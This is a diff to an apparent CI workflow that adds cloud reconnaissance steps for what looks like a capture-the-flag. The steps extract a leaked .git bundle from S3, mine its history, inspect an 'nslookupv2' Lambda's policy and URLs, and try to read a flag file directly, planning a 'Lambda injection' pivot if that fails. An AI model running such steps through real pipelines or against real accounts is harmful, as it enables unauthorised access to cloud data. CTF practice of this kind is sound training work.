@@ -126,6 +126,72 @@ jobs:
               --output text || true
           done
 
+      - name: Extract and Analyze Git History
+        run: |
+          set -euo pipefail
+
+          mkdir -p git-analysis
+          cd git-analysis
+
+          # Download from the public platform bucket
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/dotgit.zip dotgit.zip
+
+          # Unzip the git bundle
+          unzip dotgit.zip
+
+          # If it unpacked directly as a .git directory, initialize a working tree
+          if [ -d ".git" ]; then
+            echo "Found .git folder, checking out master/main..."
+            git checkout -f || git checkout -b main || true
+          fi
+
+          echo "=== Git Log ==="
+          git log --oneline -n 50 || true
+
+          echo "=== Git Reflog ==="
+          git reflog || true
+
+          echo "=== Show Files in Repo ==="
+          find . -maxdepth 4 -not -path '*/.*'
+
+          echo "=== Inspecting Commits ==="
+          # Search commit history for keywords
+          git log -S "nslookup" --oneline || true
+          git log -S "api" --oneline || true
+
+          # Show details of the latest 3 commits
+          git show HEAD || true
+          git show HEAD~1 || true
+
+      - name: Inspect nslookupv2 configuration
+        run: |
+          set -euo pipefail
+
+          # Get policy to see what triggers it (e.g. API Gateway, S3, etc.)
+          aws lambda get-policy \
+            --function-name nslookupv2 \
+            --region us-east-1 \
+            --output json > nslookupv2-policy.json || true
+          cat nslookupv2-policy.json || true
+
+          # Check if there is an active Function URL (Direct HTTPS endpoint)
+          aws lambda list-function-url-configs \
+            --function-name nslookupv2 \
+            --region us-east-1 \
+            --output json > nslookupv2-urls.json || true
+          cat nslookupv2-urls.json || true
+
+      - name: Direct Flag Access Attempt
+        run: |
+          set -u
+          aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt || true
+          if [ -f /tmp/flag.txt ]; then
+            echo "=== DIRECT FLAG ACCESS SUCCESSFUL ==="
+            cat /tmp/flag.txt
+          else
+            echo "Direct access denied. We must pivot through the Lambda injection."
+          fi
+
       - name: Fetch CloudFront details
         run: |
           set -euo pipefail
